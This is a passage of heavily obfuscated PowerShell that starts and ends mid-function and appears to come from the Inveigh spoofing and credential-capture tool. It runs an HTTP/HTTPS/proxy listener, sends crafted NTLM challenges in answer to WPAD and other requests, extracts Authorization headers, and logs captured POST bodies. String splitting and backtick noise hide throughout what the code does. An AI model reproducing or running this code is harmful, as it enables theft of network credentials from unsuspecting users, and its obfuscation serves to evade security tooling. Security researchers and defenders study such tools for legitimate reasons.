        ${HT`Tp_tiMe`sta`MP} =  ( gCI VaRiaBle:5E9a  )."V`AlUE"::("{1}{0}"-f'ing','ToStr').Invoke(  ${5`E9a}::("{0}{1}" -f'GetB','ytes').Invoke(${HTtP`_T`i`meSta`Mp}))
        ${h`T`TP_TIMe`ST`Amp} = ${hTTP_Ti`Mest`A`mP}.("{1}{0}"-f'it','Spl').Invoke("-") | &("{0}{2}{1}" -f 'ForEa','ect','ch-Obj'){[Char] (gEt-vARiabLE  VWE -VAlUeO)::("{1}{0}"-f'oInt16','T').Invoke(${_},16)}

        if(${Cha`l`l`ENGe})
        {
            ${HTTP_`cha`L`leNgE} = ${chAlL`eN`Ge}
            ${HTTP_`ch`AlLEn`g`e_b`ytEs} = ${hTTP_`chAll`En`gE}.("{1}{0}" -f 'ert','Ins').Invoke(2,'-').("{0}{1}"-f'Inser','t').Invoke(5,'-').("{1}{0}" -f'rt','Inse').Invoke(8,'-').("{1}{0}" -f'rt','Inse').Invoke(11,'-').("{0}{1}"-f'Inser','t').Invoke(14,'-').("{0}{1}" -f'Ins','ert').Invoke(17,'-').("{1}{0}" -f'sert','In').Invoke(20,'-')
            ${http`_cHalLeNg`E_`B`y`TES} = ${HtTP_ch`AL`le`N`G`E_bY`TEs}.("{0}{1}" -f'S','plit').Invoke("-") | &("{0}{3}{2}{1}"-f'ForE','ct','e','ach-Obj'){[Char]  (  ls  ("VariAB"+"l"+"E:Vwe"))."V`ALUE"::("{2}{0}{1}" -f't','16','ToIn').Invoke(${_},16)}
        }
        else
        {
            ${h`Tt`P_`CHALLENGe_BYTEs} = [String](1..8 | &("{1}{3}{0}{2}"-f'c','ForEach-','t','Obje') {"{0:X2}" -f (&("{0}{2}{1}"-f 'Ge','Random','t-') -Minimum 1 -Maximum 255)})
            ${H`Ttp`_cH`AllE`Nge} = ${Htt`P_chA`l`Leng`e_Byt`Es} -replace ' ', ''
            ${Ht`TP_cha`lL`e`NGE_B`YteS} = ${hTtP_`C`ha`lLEnGe_`ByTes}.("{0}{1}" -f 'S','plit').Invoke(" ") | &("{3}{2}{0}{1}" -f '-Obje','ct','rEach','Fo'){[Char] (  get-CHILDITem  ('VaRI'+'abL'+'E:VWE') )."Va`LUE"::("{0}{1}{2}"-f'ToI','nt','16').Invoke(${_},16)}
        }

        ${i`N`VeIgH}."HtTP`_c`h`ALlengE`_Queue".("{0}{1}" -f'Ad','d').Invoke(${clieNTi`PAddr`E`ss} + ${c`lieNtp`ort} + ',' + ${hTt`P_`C`halLeNGE})  > ${N`ULL}

        if(${nt`l`mess})
        {
            ${HTtP_nt`l`M_neGo`TiAtI`On_`Fl`A`Gs} = 0x05,0x82,0x89,0x0a
        }
        else
        {
            ${htTP`_NTlm`_ne`GotiatioN_`FL`AGs} = 0x05,0x82,0x81,0x0a
        }

        ${htT`p_`Nt`lM_ByTEs} = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,
                            0x00,0x00,0x00 +
                            ${Htt`p_`NTLm_`N`e`gotI`ATi`oN_flaGs} +
                            ${HtTP_`CHaL`L`eNGE_BYtes} +
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x82,0x00,0x3e,0x00,0x00,0x00,0x06,
                            0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f,0x4c,0x00,0x41,0x00,0x42,0x00,0x02,0x00,0x06,0x00,
                            0x4c,0x00,0x41,0x00,0x42,0x00,0x01,0x00,0x10,0x00,0x48,0x00,0x4f,0x00,0x53,0x00,0x54,
                            0x00,0x4e,0x00,0x41,0x00,0x4d,0x00,0x45,0x00,0x04,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,
                            0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x03,0x00,0x24,
                            0x00,0x68,0x00,0x6f,0x00,0x73,0x00,0x74,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,
                            0x2e,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,
                            0x00,0x6c,0x00,0x05,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,
                            0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x07,0x00,0x08,0x00 +
                            ${hT`Tp_Ti`M`es`TAmP} +
                            0x00,0x00,0x00,0x00,0x0a,0x0a

        ${n`TlM_CHALLeN`Ge_bA`se`64} =   (gCI  ("VarI"+"a"+"ble:vW"+"E"))."v`ALuE"::"TobAs`E`6`4st`Ring"(${hTT`P_`N`TlM_ByT`Es})
        ${Nt`lm} = ("{0}{1}"-f 'N','TLM ') + ${N`TlM_`chall`En`gE_bAs`e`64}
        ${NT`lm_C`H`AlLE`Nge} = ${hTTP_CH`A`LlE`Nge}
        
        return ${nT`lm}
    }

    if(${httPS_lISt`E`Ner})
    {
        ${hT`T`P_TyPe} = ("{1}{0}" -f'TPS','HT')
    }
    elseif(${prOXy_li`s`Te`Ner})
    {
        ${H`TtP_`T`ype} = ("{1}{0}"-f 'roxy','P')
    }
    else
    {
        ${hT`TP`_Type} = ("{1}{0}" -f 'TP','HT')
    }

    if(${h`TTpiP} -ne ("{0}{1}{2}"-f '0.','0','.0.0'))
    {
        ${HT`Tp`ip} =  (cHildiTEM ("vARI"+"abLe:"+"1"+"70"+"n"))."VAl`Ue"::("{0}{1}"-f'Pa','rse').Invoke(${Htt`PIp})
        ${HTtp_e`NDP`o`iNT} = &("{0}{2}{1}" -f 'New','Object','-') ("{2}{3}{4}{0}{1}"-f 'Net.IPEndP','oint','S','ystem','.')(${H`TTpip},${httpP`o`Rt})
    }
    else
    {
        ${Ht`TP_`eNdP`oi`NT} = &("{3}{0}{2}{1}"-f '-','ect','Obj','New') ("{4}{0}{2}{1}{3}"-f'em','t.','.Ne','IPEndPoint','Syst')( ${170n}::"A`NY",${hTtP`Port})
    }

    ${HT`T`P_Runni`Ng} = ${T`RUE}
    ${HT`TP`_`lIStE`NER} = &("{0}{1}{2}" -f'New','-','Object') ("{1}{0}{6}{4}{9}{8}{7}{5}{2}{3}"-f'st','Sy','e','r','.Socket','en','em.Net','ist','.TcpL','s') ${HttP`_eNdpo`Int}
    ${HTTP`_Cl`IENT_C`L`ose} = ${T`RuE}

    if(${pROx`y_LiS`TEN`eR})
    {
        ${HTtp_`l`INGer} = &("{1}{2}{0}" -f'ject','N','ew-Ob') ("{1}{0}{3}{5}{2}{4}" -f 'y','S','et.Soc','stem.','kets.LingerOption','N')(${t`RUe},0)
        ${Ht`T`p_liS`T`Ener}."s`erVeR"."lIN`GeRst`ATe" = ${HtT`P`_LIng`Er}
    }
    
    try
    {
        ${http`_liS`T`e`NeR}.("{0}{1}"-f 'St','art').Invoke()
    }
    catch
    {
        ${iN`Ve`IgH}."cOn`So`l`E`_QUEuE".("{0}{1}" -f 'A','dd').Invoke(("$(Get-Date -format 's') - Error starting $HTTP_type listener "))
        ${hTtP`_`RU`NNInG} = ${f`ALse}

        if(${I`NvEi`gH}."fiLe`_oU`TpUT")
        {
            ${in`Ve`IGh}."lo`G_fI`Le_Q`UEuE".("{0}{1}"-f 'Ad','d').Invoke(("$(Get-Date -format 's') - Error starting $HTTP_type listener "))
        }

        if(${I`N`VeIgH}."log_O`UTP`Ut")
        {
            ${i`NVEIGh}."l`og".("{0}{1}"-f 'A','dd').Invoke(("$(Get-Date -format 's') - Error starting $HTTP_type listener "))
        }

    }
    
    :HTTP_listener_loop while(${I`NV`EigH}."R`U`NNing" -and ${h`TT`P_r`UnNINg})
    {
        ${Tcp`_`R`EQUeSt} = ""
        ${t`Cp`_`REQU`est`_bYtES} = &("{0}{2}{1}"-f 'New-O','ct','bje') ("{3}{2}{0}{1}"-f 'Byt','e[]','stem.','Sy') 4096
        ${H`Ttp_s`end} = ${t`RUE}
        ${H`TTp_H`eADEr`_CO`NTEnt_tyPe} = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 +  ( geT-CHILdITEm ("vaRI"+"ablE"+":l"+"n5H"))."VA`luE"::"U`Tf8".("{1}{0}{2}" -f'et','G','Bytes').Invoke(("{0}{1}{2}" -f 'text/h','t','ml'))
        ${hTtP_He`ADeR_cAChe_`co`N`TroL} = ""
        ${H`Ttp_HeaDer_a`UtH`En`T`i`CATe} = ""
        ${Ht`Tp`_He`Ad`eR_A`U`T`H`ENtI`cAte_dATa} = ""
        ${HT`Tp_M`E`sSAge} = ""
        ${H`Tt`P_h`Ea`dE`R_aUT`HO`RIzaTion} = ""
        ${hTtP_h`EA`dEr_hO`ST} = ""
        ${Ht`TP_h`EA`dER_U`s`er_a`gEnT} = ""
        ${hTtP_r`EQ`U`EsT`_raW_uRL} = ""
        ${Nt`lM} = ("{0}{1}" -f'NTL','M')

        while(!${H`Ttp_li`ST`EN`Er}.("{1}{0}" -f'ding','Pen').Invoke() -and !${Http_`Cli`EnT}."c`OnNe`CTed")
        {

            &("{0}{1}{2}"-f'Start-Sle','e','p') -m 10

            if(!${i`NVeIGH}."RU`Nn`iNg")
            {
                break ("{3}{2}{1}{0}" -f 'r_loop','tene','_lis','HTTP')
            }
        
        }

        if(${h`TTp`s_LIStEner})
        {
            
            if(!${hTt`P`_ClI`ent}."co`NneCt`eD" -or ${HTt`p_C`LIE`NT_clOSe} -and ${i`N`VeiGh}."RU`Nning")
            {
                ${H`TT`p_cli`ENt} = ${hTtP`_Li`S`TEneR}.("{0}{3}{2}{1}{4}" -f'AcceptT','lien','pC','c','t').Invoke() 
	            ${h`TTP_Cle`Ar`_sTreaM} = ${HT`TP_CL`Ient}.("{0}{2}{1}" -f'GetS','ream','t').Invoke()
                ${HTtp_ST`R`EAm} = &("{1}{2}{0}"-f'ct','New-Ob','je') ("{3}{6}{5}{0}{1}{7}{2}{4}" -f 't.Sec','uri','SslStr','Syste','eam','e','m.N','ty.')(${H`TtP_`clEar`_StrEam},${fA`L`sE})
                ${ss`l`_CE`Rt} = (&("{3}{0}{1}{2}" -f't-ChildI','t','em','Ge') ((("{2}{1}{0}{3}{4}" -f'7gYLo','ert:','C','calMa','chine7gYMy'))  -cReplacE([chAR]55+[chAR]103+[chAR]89),[chAR]92) | &("{0}{3}{1}{2}" -f'Wher','-Objec','t','e') {${_}."Su`Bj`ecT" -match ${INV`eI`Gh}."c`er`TIfI`cate_CN"})
                ${H`T`Tp`_sTReam}.("{4}{1}{3}{0}{2}{5}"-f 'e','entica','r','teAsS','Auth','ver').Invoke(${S`S`l_cerT},${F`ALsE},  ${kTfO0w}::"dE`FAULt",${fA`Lse})
            }

            [Byte[]]${SsL_REQ`U`Est_`BYTEs} = ${NU`LL}

            do 
            {
                ${h`TTP`_RequEsT_b`yTE`_C`oUnt} = ${H`TTP_STR`E`AM}.("{0}{1}"-f'Rea','d').Invoke(${t`cp`_R`EQueS`T_bYTeS},0,${tcP_r`E`quEsT_`BYT`Es}."LEn`G`TH")
                ${SSL`_`ReqUeSt_`ByT`ES} += ${tCP_`R`EQuEST`_b`Y`TEs}[0..(${http_r`Eq`UesT_`By`Te_C`O`UNT} - 1)]
            } while (${hT`T`p_c`lear_sT`REAM}."dAt`AAVaiL`AblE")

            ${Tcp_RE`q`UEst} =   ( variAbLE  5e9A)."V`ALUe"::("{1}{0}{2}"-f'o','T','String').Invoke(${ssl_Requ`eSt`_`BYTEs})
        }
        else
        {

            if(!${h`TtP_`CL`IEnt}."COnN`eC`TeD" -or ${hT`TP_cLIE`N`T_`cl`OsE} -and ${i`N`VEiGh}."RuNNI`NG")
            {
                ${HTTP_`cLIE`Nt} = ${HtTP_`l`I`StE`NEr}.("{1}{2}{0}"-f'nt','AcceptTcpCl','ie').Invoke() 
	            ${H`TTp_Str`eaM} = ${httP_`Cli`e`Nt}.("{2}{3}{0}{1}" -f'ea','m','GetSt','r').Invoke()
            }

            if(${H`Tt`P_streAM}."dATa`Av`Ai`LablE")
            {
                ${H`T`T`p_DATA_avaILab`LE} = ${t`RUE}
            }
            else
            {
                ${HT`T`p_da`TA_ava`ILA`BLe} = ${F`AL`SE}
            }

            while(${Htt`P_s`Tre`Am}."D`ATaa`Vai`La`BLE")
            {
                ${htTP`_`STRE`AM}.("{0}{1}"-f 'R','ead').Invoke(${tCP`_ReQUE`s`T`_bytes},0,${tCp_`ReQU`e`st_BY`Tes}."LeNg`TH")
            }

            ${tCP_r`E`QueSt} =   ( ItEM  ('Va'+'RiA'+'BlE:5E9A') )."v`AlUE"::("{1}{2}{0}"-f'g','T','oStrin').Invoke(${tcp_r`EQues`T`_B`YTes})
        }

        if(${t`c`p_rEqU`est} -like ("{2}{1}{0}" -f'*','0','47-45-54-2') -or ${TcP_R`e`quEST} -like ("{0}{1}{2}" -f'48-','45-41-44-2','0*') -or ${tcP`_r`e`QUeSt} -like ("{0}{6}{4}{5}{2}{3}{1}"-f'4f','3-20*','4f-4e','-5','5','0-54-49-','-') -or ${Tcp`_r`E`queST} -like ("{4}{0}{1}{5}{2}{3}"-f'3-4','f','-','54*','4','-4e-4e-45-43') -or ${t`cp_r`EQ`UESt} -like ("{0}{1}{2}"-f'50-4f-53-5','4','*'))
        {
            ${hT`TP_raw`_`UrL} = ${T`cp_rE`quE`st}.("{2}{1}{0}" -f 'string','ub','S').Invoke(${tcP_`RE`q`UesT}.("{2}{0}{1}"-f 'e','xOf','Ind').Invoke(("{1}{0}"-f '20-','-')) + 4,${TC`P_RE`Q`UEST}.("{2}{0}{1}" -f'rin','g','Subst').Invoke(${t`Cp_R`eQUEst}.("{1}{2}{0}"-f 'f','In','dexO').Invoke(("{0}{1}"-f '-20','-')) + 1).("{0}{2}{1}"-f'In','exOf','d').Invoke(("{1}{0}"-f'-','-20')) - 3)
            ${HTTp`_`Ra`w_URl} = ${Ht`TP_R`AW`_UrL}.("{1}{0}"-f'it','Spl').Invoke("-") | &("{2}{0}{3}{1}"-f 'rE','ject','Fo','ach-Ob'){[Char]  (gEt-ChILdiTem  ("vA"+"R"+"iabLE:Vwe") )."V`AlUe"::("{2}{1}{0}"-f'6','1','ToInt').Invoke(${_},16)}
            ${HtTp`_r`E`quesT_`RAw`_urL} = &("{1}{0}{2}" -f 'ew-Ob','N','ject') ("{1}{0}{3}{2}"-f 'tem.S','Sys','ng','tri') (${HT`T`p_RA`w_`URL},0,${HTtP_RAW`_`URL}."Len`gtH")
            ${HT`Tp_`SOU`R`CE_ip} = ${htTP_`CL`Ie`NT}."clI`enT"."R`Em`OT`eENDpO`int"."aD`dRESs"."Ip`ADDR`ESSto`StRi`Ng"

            if(${n`BnS`BR`Ut`EfORCePAuse})
            {
                ${In`VEIGh}."NBnS`_s`TOp`wAtch" =  ( dir vaRiable:cW5)."V`Alue"::("{2}{0}{1}" -f 'a','rtNew','St').Invoke()
                ${inV`e`Igh}."Ho`stn`AM`e_spooF" = ${Tr`UE}
            }
            
            if(${T`Cp`_Re`Quest} -like ("{2}{0}{1}{3}"-f'-48-6F-73-74-3','A-2','*','0-*'))
            {
                ${hTTP_h`ead`ER_Ho`sT_EX`Tr`A`cT} = ${tCP_R`EQu`E`sT}.("{0}{2}{1}" -f 'Sub','g','strin').Invoke(${tcp`_`REQU`EsT}.("{2}{0}{1}"-f'e','xOf','Ind').Invoke(("{1}{0}{2}{3}{4}" -f '8-6F-7','-4','3-74-3','A-2','0-')) + 19)
                ${hT`TP_headER_`host_EX`TRa`ct} = ${hTTp_hEADer_ho`ST`_e`X`T`R`ACt}.("{0}{2}{3}{1}" -f 'Su','g','bs','trin').Invoke(0,${HtTP_Hea`DE`R_`Ho`st_EXTRacT}.("{0}{1}"-f 'Inde','xOf').Invoke(("{0}{1}"-f '-0D-','0A-')))
                ${ht`T`p_hea`d`er_hOsT_eXtract} = ${htT`P_he`A`DER`_HoS`T`_exTRaCt}.("{0}{1}"-f'Spl','it').Invoke("-") | &("{2}{0}{1}{3}"-f'Each-O','b','For','ject'){[Char]  ${V`We}::("{1}{2}{0}" -f't16','T','oIn').Invoke(${_},16)}
                ${Http`_HeAD`eR_`H`OSt} = &("{1}{2}{0}"-f'ject','Ne','w-Ob') ("{0}{2}{1}"-f 'System.','tring','S') (${http_`Head`ER_HoS`T`_`ExT`R`AcT},0,${Http_He`ADe`R_`HosT_E`XT`RA`Ct}."l`En`GtH")
            }

            if(${tCP`_Re`QUe`St} -like ("{6}{2}{1}{4}{5}{0}{7}{3}{8}"-f '-6','-','3-65-72','65-6E-','2','D-41','*-55-7','7-','74-3A-20-*'))
            {
                ${http_HeADER`_`Us`ER_Ag`e`Nt_eX`T`Ract} = ${tcP`_r`EqUEST}.("{0}{1}{2}" -f 'S','ubst','ring').Invoke(${TCP`_re`QUEST}.("{0}{1}{2}"-f'Inde','xO','f').Invoke(("{9}{1}{0}{6}{8}{3}{5}{2}{4}{7}"-f '-72-','5','7','67-65','4-3A','-6E-','2','-20-','D-41-','-55-73-6')) + 37)
                ${Ht`TP_`hEaD`eR_U`sE`R_agENt_Ext`RA`ct} = ${h`TtP`_hEAdeR`_uSE`R`_agEnT_EXtr`AcT}.("{2}{1}{0}" -f 'tring','bs','Su').Invoke(0,${hT`TP_he`A`DE`R`_user_Ag`EnT_`exTRaCT}.("{1}{0}" -f 'xOf','Inde').Invoke(("{0}{1}"-f'-0D-0','A-')))
                ${htT`P_he`AdeR_u`S`e`R_AGENt`_exT`Ra`ct} = ${HTtP_`heA`Der_User_a`geN`T`_ExTRa`CT}.("{1}{0}" -f'plit','S').Invoke("-") | &("{0}{1}{2}"-f 'ForEa','ch-','Object'){[Char]  (  GEt-VariaBlE ('vW'+'E')  -VALUEONLy )::("{1}{0}" -f 't16','ToIn').Invoke(${_},16)}
                ${hTT`p_`h`E`ADEr_Use`R_AGent} = &("{2}{0}{1}" -f'O','bject','New-') ("{2}{3}{4}{0}{1}" -f'tr','ing','Sys','tem.','S') (${HtTp_h`EaDE`R_U`sE`R_`AgeNT`_E`XT`RACt},0,${H`T`TP_h`eade`R_USer_AgENT_`Ext`RA`CT}."LEn`g`TH")

                if(${h`T`TpRESe`TDELay}."co`UNT" -gt 0 -and (${htTPrese`TD`E`L`AY} | &("{1}{2}{0}" -f 'Object','Whe','re-') {${h`T`TP_heaDER_`U`s`er_AGeNT} -match ${_}}))
                {
                    ${HtTp`_RESE`T_`de`L`AY} = ${TR`Ue}
                    ${Htt`p_R`Es`ET`_`deLay`_tiMe`Out} = &("{1}{2}{0}" -f'an','N','ew-TimeSp') -Seconds ${hTt`PRESEtdela`ytImeO`UT}
                    ${h`TtP_`REseT_`DEla`y_`S`TOp`W`ATch} =  (get-vAriaBLE  cw5  )."Va`lUe"::("{1}{0}" -f'rtNew','Sta').Invoke()
                }

            }

            if(${Http_RE`ques`T`_r`AW_ur`L`_o`Ld} -ne ${HTTp_r`e`q`U`EsT_R`Aw_urL} -or ${H`TTp_cLie`NT`_`hANdLE_Old} -ne ${H`Ttp_`cLIe`NT}."cLi`ENt"."haN`DlE")
            {
                ${In`VE`iGh}."coNSO`lE_q`UE`Ue".("{1}{0}" -f'dd','A').Invoke(("$(Get-Date -format 's') - $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP "))
                ${iNV`EI`GH}."consol`e`_QUe`Ue".("{0}{1}" -f'A','dd').Invoke(("$(Get-Date -format 's') - $HTTP_type host header $HTTP_header_host received from $HTTP_source_IP "))
                ${Inve`i`GH}."c`onSO`lE_Q`U`EUe".("{1}{0}"-f 'dd','A').Invoke(("$(Get-Date -format 's') - $HTTP_type user agent received from $HTTP_source_IP`:`n$HTTP_header_user_agent "))

                if(${iNv`eI`Gh}."fi`le_`oU`TpUT")
                {
                    ${i`Nvei`Gh}."loG`_FiL`E_qu`eue".("{0}{1}"-f 'A','dd').Invoke(("$(Get-Date -format 's') - $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP "))
                    ${i`Nve`IGH}."L`OG_F`iL`E_Q`UEUe".("{1}{0}" -f'd','Ad').Invoke(("$(Get-Date -format 's') - $HTTP_type host header $HTTP_header_host received from $HTTP_source_IP "))
                    ${i`N`VeIGH}."lOG_fiL`e_`qUEUE".("{0}{1}"-f'Ad','d').Invoke(("$(Get-Date -format 's') - $HTTP_type user agent $HTTP_header_user_agent received from $HTTP_source_IP "))
                }

                if(${INve`I`GH}."LOg_O`U`TPuT")
                {
                    ${IN`Vei`Gh}."L`OG".("{0}{1}"-f'A','dd').Invoke(("$(Get-Date -format 's') - $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP "))
                    ${I`Nv`eigH}."L`Og".("{1}{0}" -f'dd','A').Invoke(("$(Get-Date -format 's') - $HTTP_type host header $HTTP_header_host received from $HTTP_source_IP "))
                    ${in`VEI`gH}."L`og".("{0}{1}"-f'Ad','d').Invoke(("$(Get-Date -format 's') - $HTTP_type user agent $HTTP_header_user_agent received from $HTTP_source_IP "))
                }

                if(${P`ROxY} -eq 'Y' -and ${proXY`i`gn`orE}."C`ount" -gt 0 -and (${PRo`X`yIGNOre} | &("{3}{2}{1}{0}" -f 't','c','e','Where-Obj') {${Http_`hEAder`_Us`Er`_AGENt} -match ${_}}))
                {
                    ${INV`EI`Gh}."cOnSoLe`_qu`euE".("{1}{0}"-f 'dd','A').Invoke(("$(Get-Date -format 's') - $HTTP_type ignoring wpad.dat request due to user agent from $HTTP_source_IP "))

                    if(${in`VeIGH}."fi`LE_ou`TP`Ut")
                    {
                        ${iNv`e`igH}."LOG_fIL`E_`qu`EUe".("{1}{0}" -f 'd','Ad').Invoke(("$(Get-Date -format 's') - $HTTP_type ignoring wpad.dat request due to user agent from $HTTP_source_IP "))
                    }

                    if(${i`NVEi`Gh}."L`OG_O`UtpUt")
                    {
                        ${InV`eI`gh}."L`OG".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - $HTTP_type ignoring wpad.dat request due to user agent from $HTTP_source_IP "))
                    }

                }

            }
            
            if(${tCp_`REQ`U`est} -like ("{0}{4}{5}{8}{3}{9}{7}{1}{2}{6}" -f '*-','A','-2','6F-72-69-7A','41-75-','74-68','0-*','9-6F-6E-3','-','-61-74-6'))
            {
                ${H`TTP`_`h`e`A`DEr`_aUthO`R`iZAtIO`N_EXtRaCT} = ${T`cp_REqu`Est}.("{0}{2}{1}"-f 'Su','tring','bs').Invoke(${tCp_R`e`q`Uest}.("{0}{1}" -f 'IndexO','f').Invoke(("{7}{1}{6}{5}{2}{3}{0}{4}" -f '-3A','7','68-6F-72-69-7A-61','-74-69-6F-6E','-20-','-','4','-41-75-')) + 46)
                ${HTtp_HEAd`Er`_a`UTH`Or`IZ`A`T`iO`N_ExTRaCT} = ${HTTp_h`E`AdE`R_Aut`H`oriz`AtION_ex`TrA`ct}.("{0}{2}{1}"-f'Subs','g','trin').Invoke(0,${httP`_h`EA`d`E`R_autho`Rizat`iOn_e`XTra`cT}.("{1}{2}{0}"-f'f','I','ndexO').Invoke(("{1}{2}{0}" -f'-','-','0D-0A')))
                ${HTtP`_`Head`E`R_a`UTHoriZ`AtIoN`_E`X`T`RaCt} = ${hTtP_H`eade`R`_`AuTH`o`RIzAtio`N`_e`X`TrACt}.("{1}{0}"-f 'plit','S').Invoke("-") | &("{3}{1}{0}{2}" -f 'ch-Obj','orEa','ect','F'){[Char] ${V`We}::("{2}{1}{0}"-f'Int16','o','T').Invoke(${_},16)}
                ${HtTp`_hEA`d`eR`_auTH`ORIZATion} = &("{0}{3}{1}{2}" -f 'Ne','bj','ect','w-O') ("{0}{1}{2}" -f'Sy','stem.S','tring') (${HtT`p_hEAd`e`R_`Au`T`hoRizatioN_extRACt},0,${HT`T`p`_hEADer_AU`T`HOR`izATIo`N_eXt`RAcT}."L`eNgTh")
            }

            if((${Htt`p_`REqUeSt_`R`AW`_`URL} -notmatch ("{1}{0}"-f 'dat','/wpad.') -and ${HTT`PA`U`TH} -eq ("{1}{0}" -f 'nonymous','A')) -or (${http_RE`Qu`EST_r`AW`_U`Rl} -match ("{0}{1}{2}"-f'/wp','ad','.dat') -and ${WPAD`AU`TH} -eq ("{0}{2}{1}" -f 'A','mous','nony')) -or (
            ${hTT`P_REq`UesT`_`RAw_u`Rl} -match ("{2}{3}{0}{1}"-f'a','t','/w','pad.d') -and ${W`Padau`Th} -like ("{1}{0}"-f'M*','NTL') -and ${w`Pada`Uthi`GNoRe}."Co`UNt" -gt 0 -and (${wPAdAut`hI`gnO`Re} | &("{1}{2}{0}{3}" -f 'Obje','Where','-','ct') {${ht`Tp`_h`EADer_uSE`R_`Ag`eNt} -match ${_}})))
            {
                ${hTTp_`R`e`sp`OnSE_STAt`US_Code} = 0x32,0x30,0x30
                ${HtTP_rE`s`PONSE`_PHRaSE} = 0x4f,0x4b
                ${httP`_clI`Ent_`ClOsE} = ${t`RuE}
            }
            else
            {

                if((${h`Ttp`_`RequEsT`_R`Aw_URL} -match ("{1}{2}{0}"-f 'at','/wpad','.d') -and ${WpA`DA`UTh} -eq ("{0}{1}" -f 'N','TLM')) -or (${hTT`P_REq`UESt_RA`W_`URL} -notmatch ("{1}{0}{2}" -f'd','/wpad.','at') -and ${HT`Tpau`TH} -eq ("{0}{1}"-f 'NT','LM')))
                {
                    ${HTt`pNt`Lm`eSS} = ${T`RUe}
                }
                else
                {
                    ${hTTPn`TlM`ess} = ${F`ALsE}
                }

                if(${pRoxY_L`i`s`TEN`eR})
                {
                    ${htt`p_resPoN`SE_st`Atus_C`O`dE} = 0x34,0x30,0x37
                    ${ht`TP`_HEaDeR_aUTHeNt`i`caTe} = 0x50,0x72,0x6f,0x78,0x79,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                }
                else
                {
                    ${H`Ttp_r`ESp`oNSe_sT`A`TUS_co`DE} = 0x34,0x30,0x31
                    ${hT`TP_`h`EA`DEr_aUT`HEntiC`ATe} = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                }
                
                ${HT`Tp_re`SpONsE_PH`RaSe} = 0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64
                ${HT`T`p_CL`IenT_CLo`Se} = ${f`A`LSE}
            }

            if(${tc`P`_R`EQuest} -like ("{1}{0}{2}"-f '0-','5','4f-53-54*'))
            {
                ${HtT`P_PO`s`T_`RequesT_extrAct} = ${tcp`_`R`eqUeST}.("{1}{2}{0}" -f 'g','Subs','trin').Invoke(${tcP`_`REqUe`st}.("{1}{2}{0}" -f 'xOf','In','de').Invoke(("{1}{2}{0}{4}{3}" -f '-0D-0','-','0D-0A','-','A')) + 12)
                ${ht`T`P_PoST`_rEQU`e`s`T_EXtR`ACT} = ${HTTP`_`poST_RE`QuesT_E`x`T`RacT}.("{0}{1}{2}" -f 'Subst','ri','ng').Invoke(0,${H`TTp_p`oST`_Re`QUEs`T_Ext`RaCT}.("{0}{1}{2}"-f 'Index','O','f').Invoke(("{1}{0}" -f '00-','-')))
                ${hTTp_Po`S`T_`RE`Q`UESt_EX`TR`Act} = ${HtTP_pO`sT_R`EQ`UeST`_EXTraCt}.("{0}{1}"-f'Spli','t').Invoke("-") | &("{1}{3}{2}{4}{0}"-f't','F','-Obje','orEach','c'){[Char]  ${v`WE}::("{2}{1}{0}"-f'Int16','o','T').Invoke(${_},16)}
                ${Htt`p_`PoST_`ReQUest} = &("{1}{0}{2}" -f 'e','New-Obj','ct') ("{3}{0}{1}{2}"-f 'y','ste','m.String','S') (${hTTp_pOst`_REQUE`S`T_Ext`RaCT},0,${H`TTp_POSt`_`ReQ`UEsT`_`EXtRACT}."Len`gtH")

                if(${Ht`Tp`_POST_rEquEs`T_`oLd} -ne ${hT`T`P_Post_r`eQUest})
                {
                    ${i`NVe`iGh}."c`oNSO`le_qUEUe".("{0}{1}"-f 'A','dd').Invoke(("$(Get-Date -format 's') - $HTTP_type POST request $HTTP_POST_request captured from $HTTP_source_IP "))
                    ${in`VEI`GH}."poSt_reQueSt_`Fi`Le_Que`Ue".("{1}{0}"-f'dd','A').Invoke(${Ht`TP_P`ost_`REqU`EST})
                    ${iN`VEiGH}."poS`T`_ReQUest_`list".("{1}{0}"-f'd','Ad').Invoke(${hT`TP_p`o`St_`ReqUE`St})

                    if(${Inv`E`igh}."f`iLe_OuT`Put")
                    {
                        ${InV`EI`gH}."COn`sOLE`_que`UE".("{1}{0}" -f 'd','Ad').Invoke(("$HTTP_type "+'PO'+'ST '+'re'+'quest '+'writte'+'n '+'to'+' '+'') + ${I`NveIgH}."pOst`_rEQUe`S`T`_o`Ut_FILE")
                        ${Inv`EI`GH}."L`Og_F`IlE_Que`Ue".("{1}{0}"-f'd','Ad').Invoke(("$(Get-Date -format 's') - $HTTP_type POST request captured from $HTTP_source_IP "))
                    }

                    if(${inv`eI`Gh}."LOG_o`U`TPUt")
                    {
                        ${In`VE`IGH}."l`Og".("{0}{1}" -f'Ad','d').Invoke(("$(Get-Date -format 's') - $HTTP_type POST request captured from $HTTP_source_IP "))
                    }

                }

                ${hTt`p_pOsT_`REqU`EsT_old} = ${ht`TP_`Pos`T_requeSt}
            }
            
            if(${hT`Tp_hE`AdEr_Au`Tho`RiZA`Ti`oN}.("{1}{0}{2}" -f'artsWit','St','h').Invoke(("{1}{0}"-f 'TLM ','N')))
            {
                
